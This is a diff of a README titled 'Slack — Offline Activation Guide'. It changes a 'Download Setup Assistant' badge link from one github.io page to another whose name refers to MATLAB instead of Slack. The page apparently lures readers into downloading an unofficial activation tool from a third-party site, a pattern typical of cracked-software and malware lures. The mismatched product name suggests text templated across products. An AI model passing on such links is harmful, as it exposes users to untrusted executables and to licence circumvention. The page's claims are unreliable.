@@ -1,6 +1,6 @@
 # Slack — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://slack-pro.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://matlab-pro.github.io/.github)
 
 ## ⚙️ How to Use
 1. Download the setup assistant using the button above  
